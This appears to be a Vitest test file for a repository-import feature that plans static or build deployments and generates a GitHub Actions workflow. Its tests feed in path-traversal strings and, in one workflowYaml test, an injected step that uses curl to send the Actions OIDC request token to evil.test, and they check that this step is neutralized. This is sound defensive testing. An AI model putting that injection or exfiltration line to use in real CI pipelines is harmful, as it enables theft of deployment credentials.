/**
 * V11 §11 Import (Lane C), the pure parts: owner input normalization, the
 * zipball → subtree cut, the Repo Scan verdict (static / build / refused
 * with a reason the owner can act on), the generated workflow, and which
 * link a push or an Actions push lands on.
 */
import { describe, expect, it } from "vitest";
import type { BundleFile } from "../miniapps/bundles";
import {
  ImportError,
  matchBuildLink,
  normalizeBranch,
  normalizeDir,
  planRepository,
  pushTargets,
  repoSubtree,
  workflowYaml,
  WORKFLOW_PATH,
  type RepoLink,
} from "./import";

function tree(files: Record<string, string>): BundleFile[] {
  return Object.entries(files).map(([path, text]) => ({ path, bytes: Buffer.from(text) }));
}

function zipball(files: Record<string, string>, wrapper = "alice-site-abc1234"): BundleFile[] {
  return tree(Object.fromEntries(Object.entries(files).map(([p, t]) => [`${wrapper}/${p}`, t])));
}

const HTML = "<!doctype html><html><body>hi</body></html>";

describe("normalizeDir", () => {
  it.each([
    ["", ""],
    [undefined, ""],
    ["/site/", "site"],
    ["apps/web/out", "apps/web/out"],
    ["  docs ", "docs"],
  ])("normalizes %j → %j", (input, expected) => {
    expect(normalizeDir(input)).toBe(expected);
  });

  it.each(["../etc", "site/../..", "./site", "a//b", "site\\x", "a b", "x".repeat(256)])(
    "rejects %j",
    (input) => {
      expect(() => normalizeDir(input)).toThrow(ImportError);
    }
  );
});

describe("normalizeBranch", () => {
  it.each(["main", "release/2026-09", "feat_x.y"])("accepts %s", (b) => {
    expect(normalizeBranch(` ${b} `)).toBe(b);
  });
  it.each(["", "a..b", "a b", "x~1", "ref^", "a:b", "a?", "a*", "a[", "back\\slash", "trail/"])(
    "rejects %j",
    (b) => {
      expect(() => normalizeBranch(b)).toThrow(ImportError);
    }
  );
});

describe("repoSubtree", () => {
  it("strips the zipball wrapper folder and drops dot-entries", () => {
    const { files, skipped } = repoSubtree(
      zipball({
        "index.html": HTML,
        "app.js": "1",
        ".github/workflows/ci.yml": "x",
        ".gitignore": "x",
        "assets/.DS_Store": "x",
        LICENSE: "MIT",
        Makefile: "all:",
      }),
      ""
    );
    expect(files.map((f) => f.path).sort()).toEqual(["app.js", "index.html"]);
    expect(skipped.sort()).toEqual(["LICENSE", "Makefile"]);
  });

  it("re-roots at the selected directory and ignores siblings", () => {
    const { files } = repoSubtree(
      zipball({
        "index.html": "root",
        "site/index.html": HTML,
        "site/css/a.css": "a{}",
        "site2/index.html": "no",
        "sitex.html": "no",
      }),
      "site"
    );
    expect(files.map((f) => f.path).sort()).toEqual(["css/a.css", "index.html"]);
  });

  it("ignores stray root entries and the wrapper itself", () => {
    const { files } = repoSubtree(
      [
        { path: "alice-site-abc/", bytes: Buffer.alloc(0) },
        { path: "pax_global_header", bytes: Buffer.from("x") },
        ...zipball({ "index.html": HTML }),
      ],
      ""
    );
    expect(files.map((f) => f.path)).toEqual(["index.html"]);
  });
});

describe("planRepository", () => {
  it("serves a plain index.html tree as-is", () => {
    const plan = planRepository(tree({ "index.html": HTML, "main.js": "console.log(1)" }));
    expect(plan.mode).toBe("static");
    expect(plan.buildCommand).toBeNull();
    expect(plan.envVars).toEqual([]);
  });

  it("stays static with a package.json that has no build script", () => {
    const plan = planRepository(
      tree({
        "index.html": HTML,
        "package.json": JSON.stringify({ scripts: { lint: "eslint ." }, devDependencies: { eslint: "9" } }),
      })
    );
    expect(plan.mode).toBe("static");
  });

  it("plans a Vite build with the lockfile's package manager", () => {
    const plan = planRepository(
      tree({
        "package.json": JSON.stringify({ scripts: { build: "vite build" }, devDependencies: { vite: "6" } }),
        "pnpm-lock.yaml": "",
        "src/main.ts": "console.log(import.meta.env.VITE_API_URL, import.meta.env.VITE_THEME)",
      })
    );
    expect(plan).toMatchObject({
      mode: "build",
      framework: "Vite",
      packageManager: "pnpm",
      buildCommand: "pnpm run build",
      outputDir: "dist",
      envVars: ["VITE_API_URL", "VITE_THEME"],
    });
  });

  it.each([
    [{ next: "15" }, "Next.js", "out", /output: 'export'/],
    [{ "@sveltejs/kit": "2" }, "SvelteKit", "build", /adapter-static/],
    [{ nuxt: "3" }, "Nuxt", ".output/public", /nuxt generate/],
    [{ astro: "5" }, "Astro", "dist", /builds in your repository/],
    [{ "react-scripts": "5" }, "Create React App", "build", /builds in your repository/],
    [{ "@11ty/eleventy": "3" }, "Eleventy", "_site", /builds in your repository/],
  ])("detects %j as %s → %s", (deps, framework, outputDir, note) => {
    const plan = planRepository(
      tree({
        "package.json": JSON.stringify({ scripts: { build: "build" }, dependencies: deps }),
        "package-lock.json": "{}",
      })
    );
    expect(plan.framework).toBe(framework);
    expect(plan.outputDir).toBe(outputDir);
    expect(plan.packageManager).toBe("npm");
    expect(plan.notes.some((n) => note.test(n))).toBe(true);
  });

  it("refuses when neither index.html nor package.json is there", () => {
    expect(() => planRepository(tree({ "src/app.ts": "" }))).toThrow(/point Import at the folder/);
  });

  it("refuses invalid package.json", () => {
    expect(() => planRepository(tree({ "package.json": "{nope" }))).toThrow(/not valid JSON/);
  });

  it("refuses server frameworks, naming them", () => {
    expect(() =>
      planRepository(
        tree({
          "package.json": JSON.stringify({ scripts: { build: "tsc" }, dependencies: { express: "4", vite: "6" } }),
          "package-lock.json": "{}",
        })
      )
    ).toThrow(/runs a server \(express\)/);
  });

  it("refuses database clients, naming them", () => {
    expect(() =>
      planRepository(
        tree({
          "package.json": JSON.stringify({
            scripts: { build: "vite build" },
            dependencies: { "@prisma/client": "5", pg: "8" },
          }),
          "package-lock.json": "{}",
        })
      )
    ).toThrow(/opens a database \(pg, @prisma\/client\)/);
  });

  it("refuses sources that read secret-looking env vars", () => {
    expect(() =>
      planRepository(
        tree({
          "package.json": JSON.stringify({ scripts: { build: "vite build" }, devDependencies: { vite: "6" } }),
          "package-lock.json": "{}",
          "src/api.ts": "fetch(u, { headers: { auth: process.env.STRIPE_SECRET_KEY } }); process.env.PUBLIC_URL",
        })
      )
    ).toThrow(/STRIPE_SECRET_KEY/);
  });

  it("does not scan node_modules or huge files for env refs", () => {
    const plan = planRepository(
      tree({
        "index.html": HTML,
        "node_modules/x/index.js": "process.env.SECRET_TOKEN",
        "big.js": `${"a".repeat(600 * 1024)} process.env.OTHER_SECRET`,
      })
    );
    expect(plan.envVars).toEqual([]);
  });

  it("refuses a build without a lockfile", () => {
    expect(() =>
      planRepository(
        tree({
          "package.json": JSON.stringify({ scripts: { build: "vite build" }, devDependencies: { vite: "6" } }),
        })
      )
    ).toThrow(/commit a lockfile/);
  });

  it("refuses a package.json with no build script and no index.html", () => {
    expect(() =>
      planRepository(
        tree({
          "package.json": JSON.stringify({ scripts: { start: "node server.js" } }),
          "package-lock.json": "{}",
        })
      )
    ).toThrow(/no build script/);
  });
});

describe("workflowYaml", () => {
  const plan = planRepository(
    tree({
      "package.json": JSON.stringify({ scripts: { build: "vite build" }, devDependencies: { vite: "6" } }),
      "package-lock.json": "{}",
    })
  );

  it("grants only contents:read + id-token:write, installs from the lockfile, pushes to our audience", () => {
    const yaml = workflowYaml({
      branch: "main",
      dir: "",
      plan,
      pushUrl: "https://air.test/api/create/push",
      audience: "wzrd-create",
    });
    expect(yaml).toContain('branches: ["main"]');
    expect(yaml).toContain("permissions:\n  contents: read\n  id-token: write\n");
    expect(yaml).not.toMatch(/contents: write|secrets\./);
    expect(yaml).toContain("- run: npm ci");
    expect(yaml).toContain('- run: "npm run build"');
    expect(yaml).toContain('(cd "dist" && zip');
    expect(yaml).toContain("&audience=wzrd-create");
    expect(yaml).toContain('"https://air.test/api/create/push"');
    expect(yaml).toContain("cache-dependency-path: \"package-lock.json\"");
  });

  it("quotes repository-derived commands so package metadata cannot add workflow steps", () => {
    const hostile = {
      ...plan,
      buildCommand: 'npm run build\n      - run: curl -d "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" https://evil.test\n  # "',
    };
    const yaml = workflowYaml({
      branch: "main",
      dir: "",
      plan: hostile,
      pushUrl: "https://air.test/api/create/push",
      audience: "wzrd-create",
    });
    const runs = yaml.split("\n").filter((line) => /^\s+- (run|uses|name):/.test(line));
    expect(runs).toHaveLength(6);
    expect(yaml).not.toContain("\n      - run: curl");
    expect(yaml).toContain('- run: "npm run build\\n      - run: curl -d \\"$ACTIONS_ID_TOKEN_REQUEST_TOKEN\\" https://evil.test\\n  # \\""');
  });

  it("works from a subdirectory with pnpm", () => {
    const yaml = workflowYaml({
      branch: "release/x",
      dir: "apps/web",
      plan: { ...plan, packageManager: "pnpm", buildCommand: "pnpm run build", outputDir: "out" },
      pushUrl: "https://air.test/api/create/push",
      audience: "wzrd-create",
    });
    expect(yaml).toContain("pnpm/action-setup@v4");
    expect(yaml).toContain("pnpm install --frozen-lockfile");
    expect(yaml).toContain('working-directory: "apps/web"');
    expect(yaml).toContain('(cd "apps/web/out" && zip');
    expect(yaml).toContain('cache-dependency-path: "apps/web/pnpm-lock.yaml"');
  });

  it("lives at the fixed workflow path", () => {
    expect(WORKFLOW_PATH).toBe(".github/workflows/wzrd-create.yml");
  });
});

function link(over: Partial<RepoLink>): RepoLink {
  return {
    id: "link-1",
    user_id: "user-alice",
    installation_id: 10,
    app_id: "app-1",
    repo_id: 123,
    full_name: "alice/site",
    branch: "main",
    dir: "",
    mode: "static",
    workflow_path: null,
    last_sha: null,
    last_synced_at: null,
    last_error: null,
    created_at: "2026-09-01T00:00:00Z",
    import_id: "import-old",
    ...over,
  };
}

describe("pushTargets", () => {
  const push = {
    ref: "refs/heads/main",
    after: "b".repeat(40),
    repository: { id: 123, full_name: "alice/site" },
    installation: { id: 10 },
  };

  it("picks static links on the pushed branch from the delivering installation", () => {
    const links = [
      link({ id: "yes" }),
      link({ id: "other-branch", branch: "dev" }),
      link({ id: "build", mode: "build", workflow_path: WORKFLOW_PATH }),
      link({ id: "other-install", installation_id: 11 }),
      link({ id: "other-repo", repo_id: 999 }),
    ];
    expect(pushTargets(links, push).map((l) => l.id)).toEqual(["yes"]);
  });

  it("does nothing for a branch deletion", () => {
    expect(pushTargets([link({})], { ...push, deleted: true })).toEqual([]);
  });
});

describe("matchBuildLink", () => {
  const build = link({
    id: "build",
    mode: "build",
    workflow_path: WORKFLOW_PATH,
  });
  const claims = {
    repository_id: "123",
    ref: "refs/heads/main",
    job_workflow_ref: `alice/site/${WORKFLOW_PATH}@refs/heads/main`,
  };

  it("matches the build link for the same repo, branch and committed workflow", () => {
    expect(matchBuildLink([link({ id: "static" }), build], claims)?.id).toBe("build");
  });

  it.each([
    ["another repository", { repository_id: "124" }],
    ["another branch", { ref: "refs/heads/dev" }],
    ["a renamed workflow", { job_workflow_ref: "alice/site/.github/workflows/other.yml@refs/heads/main" }],
    ["a fork's workflow", { job_workflow_ref: `mallory/site/${WORKFLOW_PATH}@refs/heads/main` }],
    ["a path that merely starts alike", { job_workflow_ref: `alice/site/${WORKFLOW_PATH}.bak@refs/heads/main` }],
    ["the workflow taken from another branch", { job_workflow_ref: `alice/site/${WORKFLOW_PATH}@refs/heads/dev` }],
    ["the workflow taken from a tag", { job_workflow_ref: `alice/site/${WORKFLOW_PATH}@refs/tags/v1` }],
    ["the workflow pinned to a commit", { job_workflow_ref: `alice/site/${WORKFLOW_PATH}@${"a".repeat(40)}` }],
    ["an empty ref", { job_workflow_ref: `alice/site/${WORKFLOW_PATH}@` }],
  ])("refuses %s", (_label, over) => {
    expect(matchBuildLink([build], { ...claims, ...over })).toBeNull();
  });

  it("never feeds a static link", () => {
    expect(matchBuildLink([link({ id: "static" })], claims)).toBeNull();
  });
});
